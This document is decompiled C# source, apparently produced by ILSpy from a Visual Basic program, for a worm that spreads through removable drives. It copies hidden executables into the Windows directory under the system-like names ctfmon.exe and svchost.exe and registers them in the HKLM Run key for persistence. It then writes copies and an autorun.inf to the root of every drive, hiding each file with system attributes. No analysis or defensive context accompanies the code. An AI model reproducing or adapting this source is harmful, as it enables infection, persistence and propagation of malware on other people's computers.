using System.IO;
using System.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace System;

[StandardModule]
internal sealed class Module1
{
	public static object strings;

	public static object drives;

	public static object drive;

	public static object apppath;

	public static object winpath;

	[STAThread]
	public static void Main()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					apppath = ((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath().ToString() + "\\";
					winpath = Environment.SystemDirectory.ToString().Remove(checked(Environment.SystemDirectory.ToString().Length - 8), 8);
					if (Operators.ConditionalCompareObjectNotEqual(apppath, winpath, false))
					{
						copy();
					}
					if (Operators.ConditionalCompareObjectEqual(apppath, winpath, false))
					{
						viro();
					}
					break;
				case 128:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto IL_00b6;
					}
					break;
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 128;
				continue;
			}
			break;
			IL_00b6:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void copy()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
					{
						RegistryKey registryKey = ((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().CreateSubKey("Software\\microsoft\\windows\\currentversion\\run");
						ProjectData.ClearProjectError();
						num2 = 2;
						FileSystem.SetAttr("\\_Volume\\F8@BC75964= -9HEX2ASC.exe", (FileAttribute)7);
						FileSystem.SetAttr("\\autorun.inf", (FileAttribute)7);
						FileSystem.SetAttr("\\_Volume\\start.exe", (FileAttribute)7);
						FileSystem.SetAttr("\\_volume", (FileAttribute)7);
						strings = Environment.SystemDirectory.ToString();
						a();
						b();
						c();
						registryKey.SetValue("CTFMON", strings.ToString()!.Remove(strings.ToString()!.Length - 8, 8) + "ctfmon.exe");
						registryKey.SetValue("svchost", strings.ToString()!.Remove(strings.ToString()!.Length - 8, 8) + "svchost.exe");
						registryKey.Close();
						break;
					}
					case 223:
						num = -1;
						switch (num2)
						{
						case 2:
							break;
						default:
							goto IL_0115;
						}
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 223;
				continue;
			}
			break;
			IL_0115:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void viro()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		object obj = default(object);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num2 = 2;
						strings = Environment.SystemDirectory.ToString();
						if (ForLoopControl.ForLoopInitObj(drive, (object)0, (object)(DriveInfo.GetDrives().Length - 1), (object)1, ref obj, ref drive))
						{
							do
							{
								drives = DriveInfo.GetDrives()[Conversions.ToInteger(drive)].Name.ToString();
								d();
								e();
								f();
								g();
							}
							while (ForLoopControl.ForNextCheckObj(drive, obj, ref drive));
						}
						FileSystem.SetAttr(strings.ToString()!.Remove(strings.ToString()!.Length - 8, 8) + "ctfmon.exe", (FileAttribute)7);
						FileSystem.SetAttr(strings.ToString()!.Remove(strings.ToString()!.Length - 8, 8) + "systeminf.inf", (FileAttribute)7);
						FileSystem.SetAttr(strings.ToString()!.Remove(strings.ToString()!.Length - 8, 8) + "svchost.exe", (FileAttribute)7);
						break;
					case 285:
						num = -1;
						switch (num2)
						{
						case 2:
							break;
						default:
							goto IL_0155;
						}
						break;
					}
				}
			}
			catch (object obj2) when (obj2 is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 285;
				continue;
			}
			break;
			IL_0155:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void a()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					FileSystem.FileCopy("\\_Volume\\F8@BC75964= -9HEX2ASC.exe", strings.ToString()!.Remove(checked(strings.ToString()!.Length - 8), 8) + "ctfmon.exe");
					break;
				case 64:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto end_IL_0000;
					}
					break;
				}
				num3 = 1;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj, num3);
				try0000_dispatch = 64;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void b()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					FileSystem.FileCopy("\\autorun.inf", strings.ToString()!.Remove(checked(strings.ToString()!.Length - 8), 8) + "systeminf.inf");
					break;
				case 64:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto end_IL_0000;
					}
					break;
				}
				num3 = 2;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj, num3);
				try0000_dispatch = 64;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void c()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					FileSystem.FileCopy("\\_Volume\\start.exe", strings.ToString()!.Remove(checked(strings.ToString()!.Length - 8), 8) + "svchost.exe");
					break;
				case 64:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto end_IL_0000;
					}
					break;
				}
				num3 = 3;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj, num3);
				try0000_dispatch = 64;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void d()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					FileSystem.MkDir(drives.ToString() + "_volume");
					break;
				case 36:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto end_IL_0000;
					}
					break;
				}
				num3 = 4;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj, num3);
				try0000_dispatch = 36;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void e()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					FileSystem.FileCopy(strings.ToString()!.Remove(checked(strings.ToString()!.Length - 8), 8) + "ctfmon.exe", drives.ToString() + "_Volume\\F8@BC75964= -9HEX2ASC.exe");
					break;
				case 79:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto end_IL_0000;
					}
					break;
				}
				num3 = 4;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj, num3);
				try0000_dispatch = 79;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void f()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					FileSystem.FileCopy(strings.ToString()!.Remove(checked(strings.ToString()!.Length - 8), 8) + "systeminf.inf", drives.ToString() + "autorun.inf");
					break;
				case 79:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto end_IL_0000;
					}
					break;
				}
				num3 = 5;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj, num3);
				try0000_dispatch = 79;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void g()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					FileSystem.FileCopy(strings.ToString()!.Remove(checked(strings.ToString()!.Length - 8), 8) + "svchost.exe", drives.ToString() + "_Volume\\start.exe");
					break;
				case 79:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto end_IL_0000;
					}
					break;
				}
				num3 = 6;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj, num3);
				try0000_dispatch = 79;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
